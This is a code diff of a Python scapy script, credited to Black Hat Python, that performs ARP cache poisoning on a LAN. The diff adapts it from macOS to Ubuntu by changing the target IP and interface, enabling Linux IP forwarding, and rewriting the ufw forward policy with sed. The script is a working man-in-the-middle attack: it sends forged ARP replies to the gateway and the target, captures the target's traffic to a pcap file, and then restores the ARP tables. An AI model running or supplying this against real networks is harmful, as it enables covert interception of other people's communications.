@@ -1,3 +1,9 @@
+#!/usr/bin/python3
+# 
+# Python3 script for LAN packet interception using gratuitous ARP broadcasts, for use on ubuntu, based on  Black Hat Python by Justin Seitz
+# https://github.com/greenfan/
+
+
 from scapy.all import *
 import os
 import signal
@@ -7,9 +13,9 @@ import time
 
 #ARP Poison parameters
 gateway_ip = "192.168.0.1"
-target_ip = "192.168.0.2"
+target_ip = "192.168.0.111"
 packet_count = 1000
-conf.iface = "en1"
+conf.iface = "enp1s0"
 conf.verb = 0
 
 #Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
@@ -27,12 +33,17 @@ def get_mac(ip_address):
 def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
+
     print("[*] Disabling IP forwarding")
-    #Disable IP Forwarding on a mac
-    os.system("sysctl -w net.inet.ip.forwarding=0")
-    #kill process on a mac
+
+    os.system("sysctl -w net.ipv4.ip_forward=0")
+
     os.kill(os.getpid(), signal.SIGTERM)
 
+    print("[*] Reloading firewall")
+    os.system("sed -i 's/DEFAULT_FORWARD_POLICY=\"ACCEPT\"/DEFAULT_FORWARD_POLICY=\"DROP\"/' /etc/default/ufw")
+    os.system("ufw reload > /dev/null")
+    
 #Keep sending false ARP replies to put our machine in the middle to intercept packets
 #This will use our interface MAC address as the hwsrc for the ARP reply
 def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
@@ -49,10 +60,16 @@ def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
 #Start the script
 print("[*] Starting script: arp_poison.py")
 print("[*] Enabling IP forwarding")
-#Enable IP Forwarding on a mac
-os.system("sysctl -w net.inet.ip.forwarding=1")
+#Enable IP Forwarding on linux
+os.system("sysctl -w net.ipv4.ip_forward=1")
 print(f"[*] Gateway IP address: {gateway_ip}")
 print(f"[*] Target IP address: {target_ip}")
+#Enable Forwarding in UFW
+print("[*] Reloading firewall")
+os.system("sed -i 's/DEFAULT_FORWARD_POLICY=\"DROP\"/DEFAULT_FORWARD_POLICY=\"ACCEPT\"/' /etc/default/ufw")
+os.system("ufw reload > /dev/null")
+
+
 
 gateway_mac = get_mac(gateway_ip)
 if gateway_mac is None:
@@ -78,8 +95,13 @@ try:
     print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
     wrpcap(target_ip + "_capture.pcap", packets)
+
+
+
     print(f"[*] Stopping network capture..Restoring network")
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+
+
 except KeyboardInterrupt:
     print(f"[*] Stopping network capture..Restoring network")
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
